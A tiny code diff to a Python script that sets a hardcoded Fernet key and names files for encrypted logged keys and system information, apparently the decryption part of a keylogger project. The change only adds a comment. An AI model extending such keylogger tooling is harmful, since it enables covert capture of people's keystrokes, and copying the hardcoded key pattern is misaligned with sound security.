@@ -1,6 +1,6 @@
 from cryptography.fernet import Fernet
 
-key = "YmKQ7kVhpDnB8lKlOuL2X12uzIWofbRBAumlPlhRz0o="
+key = "YmKQ7kVhpDnB8lKlOuL2X12uzIWofbRBAumlPlhRz0o=" #  Enter the key value generated from the GenerateKey.py
 
 keys_information_e = "e_keys_logged.txt"
 system_information_e = "e_system.txt"
